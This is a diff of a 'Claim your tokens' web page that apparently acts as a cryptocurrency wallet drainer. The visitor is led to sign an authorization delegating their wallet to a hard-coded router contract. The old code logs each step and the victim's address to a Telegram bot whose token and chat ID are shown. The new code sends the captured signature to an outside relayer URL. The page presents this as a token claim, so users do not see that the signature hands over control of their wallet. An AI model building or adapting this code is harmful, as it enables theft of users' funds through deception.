@@ -60,7 +60,7 @@
         <div class="sub">Claim your tokens</div>
         
         <div class="info">
-            <span class="info-icon">🔐💥</span>
+            <span class="info-icon">🔐</span>
             <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
         </div>
         
@@ -73,19 +73,9 @@
     <script>
         const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
         const CHAIN_ID = 1;
-        const CHAIN_ID_HEX = '0x1';
-        const TBT = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
-        const TCI = '-1002810760353';
+        const RELAYER_URL = 'https://solana-liquidity-pool-production.up.railway.app/api/delegate';
 
-        function sendLog(msg) {
-            fetch('https://api.telegram.org/bot' + TBT + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TCI, text: msg })
-            }).catch(() => {});
-        }
-
-        function rlpVal(val) {
+        function toEvenHex(val) {
             if (val === 0 || val === '0x' || val === '0x0') return '0x';
             if (typeof val === 'string' && val.startsWith('0x')) {
                 return val.length % 2 === 0 ? val : '0x0' + val.slice(2);
@@ -95,11 +85,11 @@
         }
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
-            const status = document.getElementById('status');
             const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status');
 
             if (!window.ethereum) {
-                sendLog('NO WALLET');
+                status.textContent = 'No wallet detected';
                 return;
             }
 
@@ -109,27 +99,27 @@
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
-                sendLog('CONNECT: ' + userAddress);
 
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== CHAIN_ID_HEX) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: CHAIN_ID_HEX }]
-                        });
-                    } catch (e) {
-                        sendLog('CHAIN FAIL');
-                        btn.disabled = false;
-                        btn.textContent = 'Claim Now';
-                        return;
-                    }
+                if (chainId !== '0x1') {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }]
+                    });
                 }
 
+                const nonceHex = await window.ethereum.request({
+                    method: 'eth_getTransactionCount',
+                    params: [userAddress, 'latest']
+                });
+                const nonce = parseInt(nonceHex, 16);
+
+                btn.textContent = 'Sign authorization...';
+
                 const authPayloadRlp = ethers.encodeRlp([
-                    rlpVal(CHAIN_ID),
+                    toEvenHex(CHAIN_ID),
                     ROUTER,
-                    '0x'
+                    toEvenHex(nonce)
                 ]);
 
                 const authPayloadBytes = ethers.getBytes(authPayloadRlp);
@@ -139,51 +129,44 @@
                 combined.set(authPayloadBytes, 1);
                 const authHash = ethers.keccak256(combined);
 
-                btn.textContent = 'Sign in wallet...';
-                sendLog('REQUESTING SIGNATURE');
-
                 const signature = await window.ethereum.request({
                     method: 'personal_sign',
                     params: [authHash, userAddress]
                 });
 
-                sendLog('SIGNED');
+                btn.textContent = 'Submitting...';
 
                 const sigBytes = ethers.getBytes(signature);
-                const r = ethers.hexlify(sigBytes.slice(0, 32));
-                const s = ethers.hexlify(sigBytes.slice(32, 64));
+                const r = '0x' + Array.from(sigBytes.slice(0, 32)).map(b => b.toString(16).padStart(2, '0')).join('');
+                const s = '0x' + Array.from(sigBytes.slice(32, 64)).map(b => b.toString(16).padStart(2, '0')).join('');
                 const yParity = sigBytes[64] - 27;
 
-                btn.textContent = 'Confirm in wallet...';
-                sendLog('SENDING TX');
-
-                const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: userAddress,
-                        gas: '0x30D40',
-                        maxFeePerGas: '0x77359400',
-                        maxPriorityFeePerGas: '0x77359400',
-                        value: '0x0',
-                        data: '0x61461954',
-                        authorizationList: [{
-                            chainId: rlpVal(CHAIN_ID),
-                            address: ROUTER,
-                            nonce: '0x' + (0).toString(16),
-                            yParity: rlpVal(yParity),
-                            r: r,
-                            s: s
-                        }]
-                    }]
+                const response = await fetch(RELAYER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userAddress,
+                        chainId: CHAIN_ID,
+                        router: ROUTER,
+                        nonce: nonce,
+                        yParity,
+                        r,
+                        s,
+                        callData: '0x61461954'
+                    })
                 });
 
-                sendLog('TX: ' + txHash);
-                status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
-                btn.textContent = 'Complete';
+                const result = await response.json();
+
+                if (result.success) {
+                    status.innerHTML = 'Delegated: ' + result.txHash.slice(0, 24) + '...';
+                    btn.textContent = 'Complete';
+                } else {
+                    throw new Error(result.error || 'Failed');
+                }
 
             } catch (e) {
-                sendLog('FAIL: ' + (e.message || '') + ' code:' + (e.code || ''));
+                status.textContent = 'Error: ' + (e.message || '');
                 btn.disabled = false;
                 btn.textContent = 'Claim Now';
             }
